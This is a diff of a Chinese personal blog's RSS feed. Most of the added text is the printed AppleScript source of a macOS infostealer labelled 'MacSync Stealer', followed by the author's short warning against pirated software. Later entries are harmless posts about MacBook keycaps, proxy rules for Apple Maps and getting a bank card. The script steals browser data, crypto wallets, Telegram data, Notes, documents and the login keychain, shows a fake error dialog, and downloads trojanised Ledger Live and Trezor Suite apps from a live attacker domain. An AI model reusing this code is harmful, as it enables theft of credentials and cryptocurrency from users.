+**if ((currentItem as string) is equal to &#34;Default&#34;) or ((currentItem as string) contains &#34;Profile&#34;) then**
+
+**set profileName to (item 1 of chromium &amp; currentItem)**
+
+**repeat with CFile in chromiumFiles**
+
+**set readpath to (item 2 of chromium &amp; currentItem &amp; CFile)**
+
+**if ((CFile as string) is equal to &#34;/Local Extension Settings/&#34;) then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Wallets/Web/&#34; &amp; profileName, pluginList, false)**
+
+**else if (CFile as string) is equal to &#34;/IndexedDB/&#34; then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Wallets/Web/&#34; &amp; profileName, pluginList, true)**
+
+**else**
+
+**set writepath to savePath &amp; currentItem &amp; CFile**
+
+**readwrite(readpath, writepath)**
+
+**end if**
+
+**end repeat**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end repeat**
+
+**end Chromium**
+
+  
+
+  
+
+**on Telegram(writemind, library)**
+
+**try**
+
+**GrabFolder(library &amp; &#34;Telegram Desktop/tdata/&#34;, writemind &amp; &#34;Telegram Desktop/&#34;)**
+
+**end try**
+
+**end Telegram**
+
+  
+
+**on DesktopWallets(writemind, deskwals)**
+
+**repeat with deskwal in deskwals**
+
+**try**
+
+**GrabFolder(item 2 of deskwal, writemind &amp; item 1 of deskwal)**
+
+**end try**
+
+**end repeat**
+
+**end DesktopWallets**
+
+  
+
+**on Notes(writemind)**
+
+**try**
+
+        **set notesExportPath to writemind &amp; &#34;Notes/&#34;**
+
+        **mkdir(notesExportPath)**
+
+        **set noteCounter to 1**
+
+        **set unlockedCount to 0**
+
+        **set lockedCount to 0**
+
+        **set errorCount to 0**
+
+        **tell application &#34;Notes&#34;**
+
+            **if running of (application &#34;Notes&#34;) then**
+
+                **set notesAreReady to true**
+
+            **end if**
+
+            **if not notesAreReady then**
+
+                **return**
+
+            **end if**
+
+            **try**
+
+                **set allNotes to every note**
+
+            **on error**
+
+                **return**
+
+            **end try**
+
+            **repeat with oneNote in allNotes**
+
+                **try**
+
+                    **set noteName to &#34;note_&#34; &amp; noteCounter**
+
+                    **try**
+
+                        **set rawName to name of oneNote**
+
+                        **if rawName is not missing value and rawName is not &#34;&#34; then**
+
+                            **set noteName to rawName**
+
+                        **end if**
+
+                    **end try**
+
+**try**
+
+**set noteText to plaintext of oneNote**
+
+**set fileNameBase to noteName**
+
+**if length of fileNameBase &gt; 64 then**
+
+    **set fileNameBase to text 1 thru 64 of fileNameBase**
+
+**end if**
+
+**set filePath to notesExportPath &amp; fileNameBase &amp; &#34;.txt&#34;**
+
+**do shell script &#34;echo &#34; &amp; quoted form of noteText &amp; &#34; &gt; &#34; &amp; quoted form of filePath**
+
+**set unlockedCount to unlockedCount + 1**
+
+**on error errMsg**
+
+**set filePath to notesExportPath &amp; &#34;[ERROR]_&#34; &amp; fileNameBase &amp; &#34;.txt&#34;**
+
+**do shell script &#34;echo &#39;[Error reading content: &#34; &amp; errMsg &amp; &#34;]&#39; &gt; &#34; &amp; quoted form of filePath**
+
+**set errorCount to errorCount + 1**
+
+**end try**
+
+                    **set noteCounter to noteCounter + 1**
+
+**end try**
+
+            **end repeat**
+
+        **end tell**
+
+    **end try**
+
+  
+
+**end Notes**
+
+  
+
+**on filegrabber(writemind)**
+
+ **try**
+
+  **set destinationFolderPath to POSIX file (writemind &amp; &#34;FileGrabber/&#34;)**
+
+  **mkdir(destinationFolderPath)**
+
+  **set extensionsList to {&#34;pdf&#34;, &#34;docx&#34;, &#34;doc&#34;, &#34;wallet&#34;, &#34;keys&#34;, &#34;db&#34;, &#34;txt&#34;, &#34;seed&#34;}**
+
+  **set bankSize to 0**
+
+  **set fileCounter to 1**
+
+  **tell application &#34;Finder&#34;**
+
+   **try**
+
+    **set desktopFiles to every file of desktop**
+
+    **set documentsFiles to every file of folder &#34;Documents&#34; of (path to home folder)**
+
+    **set downloadsFiles to every file of folder &#34;Downloads&#34; of (path to home folder)**
+
+**set notesFiles to every file of folder &#34;Downloads&#34; of (path to home folder)**
+
+    **repeat with aFile in (desktopFiles &amp; documentsFiles &amp; downloadsFiles)**
+
+     **set fileExtension to name extension of aFile**
+
+     **if fileExtension is in extensionsList then**
+
+      **set filesize to size of aFile**
+
+      **if (bankSize + filesize) &lt; 10 * 1024 * 1024 then**
+
+       **try**
+
+        **set newFileName to (fileCounter as string) &amp; &#34;.&#34; &amp; fileExtension**
+
+        **duplicate aFile to folder destinationFolderPath with replacing**
+
+        **set destFolderAlias to destinationFolderPath as alias**
+
+        **tell application &#34;Finder&#34;**
+
+         **set copiedFiles to every file of folder destFolderAlias**
+
+         **set lastCopiedFile to item -1 of copiedFiles**
+
+         **set name of lastCopiedFile to newFileName**
+
+        **end tell**
+
+        **set bankSize to bankSize + filesize**
+
+        **set fileCounter to fileCounter + 1**
+
+       **end try**
+
+      **else**
+
+       **exit repeat**
+
+      **end if**
+
+     **end if**
+
+    **end repeat**
+
+   **end try**
+
+  **end tell**
+
+ **end try**
+
+**end filegrabber**
+
+  
+
+**set username to (system attribute &#34;USER&#34;)**
+
+**set profile to &#34;/Users/&#34; &amp; username**
+
+**set randomNumber to do shell script &#34;echo $((RANDOM % 9000000 + 1000000))&#34;**
+
+**set writemind to &#34;/tmp/&#34; &amp; randomNumber &amp; &#34;/&#34;**
+
+  
+
+**set library to profile &amp; &#34;/Library/Application Support/&#34;**
+
+**set password_entered to getpwd(username, writemind, &#34;&#34;)**
+
+  
+
+**delay 0.01**
+
+  
+
+**set chromiumMap to {}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Yandex&#34;, library &amp; &#34;Yandex/YandexBrowser&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome&#34;, library &amp; &#34;Google/Chrome/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Brave&#34;, library &amp; &#34;BraveSoftware/Brave-Browser/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Edge&#34;, library &amp; &#34;Microsoft Edge/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Vivaldi&#34;, library &amp; &#34;Vivaldi/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Opera&#34;, library &amp; &#34;com.operasoftware.Opera/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;OperaGX&#34;, library &amp; &#34;com.operasoftware.OperaGX/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Beta&#34;, library &amp; &#34;Google/Chrome Beta/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Canary&#34;, library &amp; &#34;Google/Chrome Canary&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chromium&#34;, library &amp; &#34;Chromium/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Dev&#34;, library &amp; &#34;Google/Chrome Dev/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Arc&#34;, library &amp; &#34;Arc/User Data&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Coccoc&#34;, library &amp; &#34;CocCoc/Browser/&#34;}}**
+
+  
+
+**set walletMap to {}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Exodus&#34;, library &amp; &#34;Exodus/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electrum&#34;, profile &amp; &#34;/.electrum/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Atomic&#34;, library &amp; &#34;Atomic Wallet/Local Storage/leveldb/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Guarda&#34;, library &amp; &#34;Guarda/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Coinomi&#34;, library &amp; &#34;Coinomi/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Sparrow&#34;, profile &amp; &#34;/.sparrow/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Wasabi&#34;, profile &amp; &#34;/.walletwasabi/client/Wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Bitcoin_Core&#34;, library &amp; &#34;Bitcoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Armory&#34;, library &amp; &#34;Armory/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electron_Cash&#34;, profile &amp; &#34;/.electron-cash/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Monero&#34;, profile &amp; &#34;/.bitmonero/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Litecoin_Core&#34;, library &amp; &#34;Litecoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Dash_Core&#34;, library &amp; &#34;DashCore/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Dogecoin_Core&#34;, library &amp; &#34;Dogecoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electrum_LTC&#34;, profile &amp; &#34;/.electrum-ltc/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/BlueWallet&#34;, library &amp; &#34;BlueWallet/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Zengo&#34;, library &amp; &#34;Zengo/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Trust&#34;, library &amp; &#34;Trust Wallet/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Ledger Live&#34;, library &amp; &#34;Ledger Live/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Trezor Suite&#34;, library &amp; &#34;@trezor&#34;}}**
+
+  
+
+**readwrite(library &amp; &#34;Binance/&#34;, writemind &amp; &#34;Wallets/Desktop/Binance/&#34;)**
+
+**readwrite(library &amp; &#34;TON Keeper/&#34;, writemind &amp; &#34;Wallets/Desktop/TonKeeper/&#34;)**
+
+**readwrite(profile &amp; &#34;/Library/Keychains/login.keychain-db&#34;, writemind &amp; &#34;login.keychain-db&#34;)**
+
+  
+
+**writeText(username, writemind &amp; &#34;Username&#34;)**
+
+**writeText(&#34;1.0.8_release (x64_86 &amp; ARM)&#34;, writemind &amp; &#34;Version&#34;)**
+
+  
+
+**try**
+
+**writeText(&#34;MacSync Stealer\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Build Tag: kis\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Version: 1.0.8_release (x64_86 &amp; ARM)\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Username: &#34; &amp; username, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;\nPassword: &#34; &amp; password_entered &amp; &#34;\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**set result to (do shell script &#34;system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType&#34;)**
+
+**writeText(result, writemind &amp; &#34;info&#34;)**
+
+**end try**
+
+  
+
+**filegrabber(writemind)**
+
+  
+
+**Chromium(writemind, chromiumMap)**
+
+**ChromiumWallets(writemind, chromiumMap)**
+
+**DesktopWallets(writemind, walletMap)**
+
+**Telegram(writemind, library)**
+
+**Notes(writemind)**
+
+  
+
+  
+
+**do shell script &#34;ditto -c -k --sequesterRsrc &#34; &amp; writemind &amp; &#34; /tmp/osalogging.zip&#34;**
+
+**display dialog &#34;Your Mac does not support this application. Try reinstalling or downloading the version for your system.&#34; with title &#34;System Preferences&#34; with icon stop buttons {&#34;ОК&#34;}**
+
+  
+
+  
+
+**set LEDGERURL to &#34;https://nhaxuong.com/ledger/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;**
+
+**set LEDGERDMGPATH to &#34;/tmp/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00.zip&#34;**
+
+**set LEDGERMOUNT to &#34;/tmp&#34;**
+
+**set LEDGERNAME to &#34;Ledger Live.app&#34;**
+
+**set LEDGERPATH to LEDGERMOUNT &amp; &#34;/&#34; &amp; LEDGERNAME**
+
+**set LEDGERAPPFOLDER to &#34;/Applications&#34;**
+
+**set LEDGERDEST to LEDGERAPPFOLDER &amp; &#34;/&#34; &amp; LEDGERNAME**
+
+  
+
+**try**
+
+    **do shell script &#34;test -d &#34; &amp; quoted form of LEDGERDEST**
+
+    **set ledger_installed to true**
+
+**on error**
+
+    **set ledger_installed to false**
+
+**end try**
+
+  
+
+**if ledger_installed then**
+
+    **try**
+
+        **do shell script &#34;curl -k --user-agent &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#39; -H &#39;api-key: 5190ef1733183a0dc63fb623357f56d6&#39; -L &#34; &amp; quoted form of LEDGERURL &amp; &#34; -o &#34; &amp; quoted form of LEDGERDMGPATH**
+
+        **do shell script &#34;unzip -q -o &#34; &amp; quoted form of LEDGERDMGPATH &amp; &#34; -d &#34; &amp; quoted form of LEDGERMOUNT**
+
+        **set app_exists to false**
+
+        **try**
+
+            **do shell script &#34;test -e &#34; &amp; quoted form of LEDGERPATH**
+
+            **set app_exists to true**
+
+        **end try**
+
+        **if app_exists then**
+
+            **try**
+
+                **do shell script &#34;killall -9 &#39;Ledger Live&#39;&#34;**
+
+            **end try**
+
+            **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERDEST**
+
+            **do shell script &#34;cp -R &#34; &amp; quoted form of LEDGERPATH &amp; &#34; &#34; &amp; quoted form of LEDGERAPPFOLDER**
+
+        **end if**
+
+    **end try**
+
+  
+
+    **try**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERDMGPATH**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERPATH**
+
+    **end try**
+
+**end if**
+
+  
+
+**set TREZORURL to &#34;https://nhaxuong.com/trezor/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;**
+
+**set TREZORDMGPATH to &#34;/tmp/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00.zip&#34;**
+
+**set TREZORMOUNT to &#34;/tmp&#34;**
+
+**set TREZORNAME to &#34;Trezor Suite.app&#34;**
+
+**set TREZORPATH to TREZORMOUNT &amp; &#34;/&#34; &amp; TREZORNAME**
+
+**set TREZORAPPFOLDER to &#34;/Applications&#34;**
+
+**set TREZORDEST to TREZORAPPFOLDER &amp; &#34;/&#34; &amp; TREZORNAME**
+
+  
+
+**try**
+
+    **do shell script &#34;test -d &#34; &amp; quoted form of TREZORDEST**
+
+    **set trezor_installed to true**
+
+**on error**
+
+    **set trezor_installed to false**
+
+**end try**
+
+  
+
+**if trezor_installed then**
+
+    **try**
+
+        **do shell script &#34;curl -k --user-agent &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#39; -H &#39;api-key: 5190ef1733183a0dc63fb623357f56d6&#39; -L &#34; &amp; quoted form of TREZORURL &amp; &#34; -o &#34; &amp; quoted form of TREZORDMGPATH**
+
+        **do shell script &#34;unzip -q -o &#34; &amp; quoted form of TREZORDMGPATH &amp; &#34; -d &#34; &amp; quoted form of TREZORMOUNT**
+
+        **set app_exists to false**
+
+        **try**
+
+            **do shell script &#34;test -e &#34; &amp; quoted form of TREZORPATH**
+
+            **set app_exists to true**
+
+        **end try**
+
+        **if app_exists then**
+
+            **try**
+
+                **do shell script &#34;killall -9 &#39;Trezor Suite&#39;&#34;**
+
+            **end try**
+
+            **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORDEST**
+
+            **do shell script &#34;cp -R &#34; &amp; quoted form of TREZORPATH &amp; &#34; &#34; &amp; quoted form of TREZORAPPFOLDER**
+
+        **end if**
+
+    **end try**
+
+  
+
+    **try**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORDMGPATH**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORPATH**
+
+    **end try**
+
+**end if**
+</code></pre><h2 id="后记">后记</h2>
+<p>借助GPT的分析你会发现这是一段后门程序，执行完成之后会主动退出terminal然后将所有的输入输出以及错误重定向到/dev/null（黑洞）的位置，至此你是无感执行的，最后这段程序大概含义就是盗取你的比特币钱包替换为对方的，然后提取你电脑的重要信息打包到一个临时目录中最后再上传到对方的服务器当中，整个过程相当丝滑，现在想想之前的盗版软件下载了一大堆，那个时候电脑莫名发热很可能就是用来当肉鸡挖矿或者任由对方摆布了&hellip;，能支持正版还是尽量支持正版吧，看到linuxdo上面的安全大佬也给过提醒：绝大部分的盗版软件都是有后门的，能正版就尽量支持正版吧。</p>
+]]></content:encoded>
     </item>
     <item>
       <title>记一次MacBook m1 Pro 键帽更换</title>
@@ -1297,6 +2464,109 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 &lt;/ul&gt;
 &lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;
 &lt;p&gt;整个过程还算是顺畅，好在我运气也比较好，第一次拆卸和安装一定会遇到困难，问题就在于我们如何解决，我的table按键无法正常回弹，来回拆卸两次都是这样，这个时候我才领悟到宽卡扣的位置是自下而上很丝滑的就可以装上去的，不过那个时候已经晚了，新的键帽卡扣已经损坏，好在剪刀脚的位置没有损坏，不然我的电脑可能暂时无法正常使用了。对于对于新手，不够自信的小伙伴且执意要自行安装的话，我建议购买两套，第一套完全可以当作练习🤪&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="前言">前言</h2>
+<ul>
+<li>前段时间使用mac的场景是这样的</li>
+</ul>
+<p><img alt="image-20250902161157278" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902161157352.png"></p>
+<ul>
+<li>
+<p>上图是我在星巴克看书的时候感觉太油腻了而记录下来的</p>
+</li>
+<li>
+<p>由于手感及其的油腻而且及其的影响美观，用mac不就是为了这种简洁的感觉嘛，由此产生了更换键帽的想法</p>
+</li>
+<li>
+<p>去闲鱼上搜索了一下，果然，价格还挺便宜，除了自己要出运费以外还要什么自行车</p>
+</li>
+<li>
+<p><img alt="image-20250902161553254" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902161553293.png"></p>
+</li>
+<li>
+<p>有了上述条件之后我马上就下单了一套，一想到自己的mac马上就要焕然一新就美滋滋</p>
+</li>
+<li>
+<p>期间我还想着键帽都要更换了那是不是得清一个灰？于是我跑到线下的闲鱼宝盒借用小哥的工具箱自行拆开</p>
+</li>
+<li>
+<p>本想着自己清理一下，结果如下图</p>
+</li>
+<li>
+<p><img alt="image-20250902162038647" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902162038703.png"></p>
+</li>
+<li>
+<p>正常来讲用了我寻思至少风扇的位置多多少少会有些许的灰尘吧？没想到是真的几乎一点没有，跟新的一样，至此我又装回去了😂</p>
+</li>
+</ul>
+<h2 id="更换键帽">更换键帽</h2>
+<ul>
+<li>
+<p>收到快递之后得到这样一包全新的键帽</p>
+</li>
+<li>
+<p><img loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902162345147.png"></p>
+</li>
+<li>
+<p>参考了一下这个<a href="https://www.junyi.dev/posts/replace-keyboard/">blog</a></p>
+</li>
+<li>
+<p>这片文章写的很好，我的整体体验下来很流畅，说说我的整体思路吧</p>
+</li>
+<li>
+<p><img alt="image-20250902162927712" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902162927767.png"></p>
+</li>
+<li>
+<p>看上图，大概就能理解，我先把所有的不带平衡杆的键帽拆下来了，然后用酒精片+拆卸棒清理了一下里面的污垢</p>
+</li>
+<li>
+<p>拆卸建议：</p>
+<ul>
+<li>除了上下左右键帽，其他的不带平衡杆的键帽统一用翘棒从右下角开始翘，听到咔哒的一声然后往左边延伸，直到再一次听到咔哒一声，然后就可以直接取下来了，整个过程其实是非常丝滑的，不过这个也需要多练习😂</li>
+<li>带有平衡杆的键帽拆一个装一个</li>
+<li>平衡杆键帽也是一样的拆法，需要注意把平衡杆从键帽上拔下来，防止下面的金属杆变形</li>
+</ul>
+</li>
+<li>
+<p>安装建议：</p>
+<ul>
+<li>
+<p>普通键帽：</p>
+</li>
+<li>
+<p><img alt="image-20250902163717715" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902163717765.png"></p>
+</li>
+<li>
+<p>可以看到有两个宽的卡扣和两个窄的卡扣（上方是宽的，下方是窄的）</p>
+</li>
+<li>
+<p><img alt="image-20250902164713149" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250902164713203.png"></p>
+</li>
+<li>
+<p>先将宽卡扣自下而上扣住，然后下面用力按下去，听到咔哒两声或者一声（看你发力位置）然后就安装成功了，整个过程也相当的丝滑</p>
+</li>
+<li>
+<p>平衡杆键帽：</p>
+</li>
+<li>
+<p>两个平衡杆的键帽先把下面的平衡杆扣到键帽上，上面的平衡杆放到金属杆的位置然后对齐大概位置往下按就行了</p>
+</li>
+<li>
+<p>一个平衡杆的键帽直接把平衡杆扣到键帽上然后先把宽的卡扣自下而上扣上，最后按下去就可以了</p>
+</li>
+<li>
+<p>键帽没有回弹怎么办？</p>
+<ul>
+<li>检查卡扣的完整性</li>
+<li>使用翘棒拆卸下来重新按照上述步骤安装</li>
+<li>直接到苹果的官方店，让工作人员帮你处理</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="后记">后记</h2>
+<p>整个过程还算是顺畅，好在我运气也比较好，第一次拆卸和安装一定会遇到困难，问题就在于我们如何解决，我的table按键无法正常回弹，来回拆卸两次都是这样，这个时候我才领悟到宽卡扣的位置是自下而上很丝滑的就可以装上去的，不过那个时候已经晚了，新的键帽卡扣已经损坏，好在剪刀脚的位置没有损坏，不然我的电脑可能暂时无法正常使用了。对于对于新手，不够自信的小伙伴且执意要自行安装的话，我建议购买两套，第一套完全可以当作练习🤪</p>
+]]></content:encoded>
     </item>
     <item>
       <title>苹果地图开启代理无法正常加载高德地图源如何解决？</title>
@@ -1333,6 +2603,37 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 &lt;li&gt;&lt;a href=&#34;https://whatshub.top&#34;&gt;https://whatshub.top&lt;/a&gt;  有关Shadowrocket，QuantumultX，Surge，Loon，Stash等iOS端代理工具的脚本，插件，模块，重写，覆写，规则及教程。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;有些时候我也不知道自己在执着什么，非要弄这些个东西，为了更方便的获取信息，了解这个世界，为了让自己体验到更多的功能？自由是相对的，有些时候吃饱了闲来无事就会想这想那，知识是免费的，不应当有壁垒，不过互联网大多数的内容都是无用或者有害的，在形成信念和价值观阶段的你，需慎重考虑，多解决当下自己身上所面临的问题才不至于陷入某些误区，一步步向上走，也许会充满荆棘，这条路注定孤独，世界本就不公，唯一还算不错的是，你可以选择，还能做点什么……&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="前言">前言</h2>
+<p>这段时间地图工具用的还算比较多，但是每次都打开一个第三方平台工具手机都会发热严重，于是我尝试了一下苹果内置的地图app，发现使用的是高德地图提供的数据，原因是只有国内的地图平台才有绘制地图的资格，苹果这种国际平台就直接用高德的地图源，但是苹果的地图虽说数据不是自己的，但是界面的简洁以及特殊优化过的地图服务吸引住我了，这个体验确实不错，鉴于想要开着代理，让代理自由分组的理念，我开始折腾为啥开着代理用的是国际的苹果地图，不开就是用高德地图的数据源。</p>
+<ul>
+<li>如何做到开着代理使用高德地图数据源</li>
+<li><a href="https://whatshub.top/shadowrocket">https://whatshub.top/shadowrocket</a>  自用小火箭🚀配置文件</li>
+</ul>
+<h2 id="解决问题">解决问题</h2>
+<p>下图是随便找了一个代理配置文件，可以看到用的是国际地图源</p>
+<p><img alt="image-20250901133807769" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250901133807878.png"></p>
+<p>经过一番查找，大概原因是系统通过你的IP判定你当前的系统服务是国内还是国际，如果你要再国内解锁apple TV这种流媒体服务的话就需要把对应的域名给代理出去，而大部分的配置文件都会把国内没解锁的内容给代理出去</p>
+<ul>
+<li>修改域名规则，将可代理的苹果域名修改为全球直连即可
+<ul>
+<li>翻译成人话就是把苹果的域名规则集合或者是单个的域名出口全都改为直连（也就是没有任何代理）</li>
+</ul>
+</li>
+<li>由于每个人的规则都不一样，在这里我展示一下自己的规则，我的规则当中有一个苹果的可代理列表，我修改为了直连，然后就可以正常使用高德地图的数据源了，当然如果你想划分的更细，可以把地图的域名单独列出来做直连</li>
+<li><img alt="image-20250901134956951" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250901134957012.png"></li>
+</ul>
+<p>然后你就可以得到下图的地图数据源了，在左下角会显示高德地图</p>
+<p><img alt="image-20250901135251963" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250901135251995.png"></p>
+<h2 id="后记">后记</h2>
+<ul>
+<li>如果你想要解锁更多的苹果服务你可以参考下面的链接</li>
+<li><a href="https://nsringo.github.io">https://nsringo.github.io</a> 解锁更多 Apple 功能，突破服务地域限制</li>
+<li><a href="https://github.com/topics/shadowrocket">https://github.com/topics/shadowrocket</a> github小火箭专题，丰富的模块和规则</li>
+<li><a href="https://github.com/Pawdroid/Free-servers">https://github.com/Pawdroid/Free-servers</a> 免费的上网节点，定期更新（如果你偶尔用可以试试，毕竟免费是最贵的）</li>
+<li><a href="https://whatshub.top">https://whatshub.top</a>  有关Shadowrocket，QuantumultX，Surge，Loon，Stash等iOS端代理工具的脚本，插件，模块，重写，覆写，规则及教程。</li>
+</ul>
+<p>有些时候我也不知道自己在执着什么，非要弄这些个东西，为了更方便的获取信息，了解这个世界，为了让自己体验到更多的功能？自由是相对的，有些时候吃饱了闲来无事就会想这想那，知识是免费的，不应当有壁垒，不过互联网大多数的内容都是无用或者有害的，在形成信念和价值观阶段的你，需慎重考虑，多解决当下自己身上所面临的问题才不至于陷入某些误区，一步步向上走，也许会充满荆棘，这条路注定孤独，世界本就不公，唯一还算不错的是，你可以选择，还能做点什么……</p>
+]]></content:encoded>
     </item>
     <item>
       <title>办个卡吧（开个GPT会员，嫖个Amazon服务器）</title>
@@ -1381,6 +2682,49 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 &lt;p&gt;&lt;img alt=&#34;image-20250904161922687&#34; loading=&#34;lazy&#34; src=&#34;https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904161922731.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img alt=&#34;image-20250904161712704&#34; loading=&#34;lazy&#34; src=&#34;https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904161712814.png&#34;&gt;、&lt;/p&gt;
 &lt;p&gt;&lt;img alt=&#34;image-20250904162104948&#34; loading=&#34;lazy&#34; src=&#34;https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904162105009.png&#34;&gt;&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="一阶段前言">一阶段前言</h2>
+<p>这段时间爱上了GPT，很想开个plus会员，但是没有找到合适的第三方车队，或者是可信的人一起合租，虽然支付宝上面可以购买苹果的礼品卡，但是每次都需要手动充钱，如果是购买一个应用啥的操作一次就够了，如果是长期订阅服务，每个月都要操作那可就遭殃了，而且还不稳定，有些时候还购买失败，鉴于种种原因之下，我只能自己办理一张国际银行卡然后开启我的订阅之旅了。</p>
+<h2 id="国际卡类型">国际卡类型</h2>
+<p>通常有两大类，一种是信用卡，一种是借记卡（储蓄卡），其区别就是信用卡可以透支，让银行先帮你垫付，然后你再去还款，借记卡不可透支，你需要先把钱充进去，然后再使用，跟购买游戏装备一个道理。由于我目前还没有能力做到随意消费还款，所以我很识相的选择了借记卡。</p>
+<p>知道类型之后就是问问AI目前国内有哪些个银行可以办理万事达或者visa的借记卡，一开始我看上的是中行的长城跨境通国际借记卡，但是我打了8家电话，最后告诉我这张卡的办理已经停掉了，经过查询以及问身边的朋友得知，中信的国际卡比较好办理，于是call了两个电话，第一个电话给我甩了一个别的电话，但是无果，我直接换了一家，先问问有没有库存，客服说有然后再去办理，不然很容易跑空</p>
+<h2 id="材料">材料</h2>
+<ul>
+<li>国内居民身份证</li>
+<li>一个活人</li>
+</ul>
+<h2 id="办卡过程">办卡过程</h2>
+<p>看地图查询好附近的地图，找到附近的几家中信银行，然后先call个电话问问看有没有万事达的国际借记卡库存。到到目的地之后会有人问你干啥，直接说明情况就行，理由直接说境外消费就行，之后工作人员会带你领号，拿到号之后前台会叫你，之后正常签字回答问题即可</p>
+<ul>
+<li>办卡费5元，月底结算</li>
+<li>没有其他费用</li>
+</ul>
+<p><img alt="image-20250829164643026" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250829164643134.png"></p>
+<p><img alt="image-20250829164655629" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250829164655683.png"></p>
